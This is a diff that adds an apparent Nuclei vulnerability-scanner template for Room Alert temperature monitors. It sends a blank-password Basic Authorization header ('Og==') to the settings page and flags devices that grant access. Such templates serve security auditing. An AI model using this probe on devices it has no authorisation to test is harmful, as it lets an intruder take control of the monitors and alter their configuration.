@@ -1,0 +1,38 @@
+id: room-alert-default-password
+info:
+  name: Room Alert Management Page Default Password
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Room Alert Temperature & Environment Monitors web page uses basic identity authentication to authenticate. A blank password can bypass the login, allowing management authority of the monitor and tampering with the device configuration.
+  reference:
+    - https://fofa.so/
+  tags: default-password
+http:
+  - raw:
+      - |
+        GET /secure/settings.htm HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 401
+      - type: word
+        part: body
+        words:
+          - "401 Unauthorized"
+  - raw:
+      - |
+        GET /secure/settings.htm HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic Og==
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "AVTECH Software, Inc."
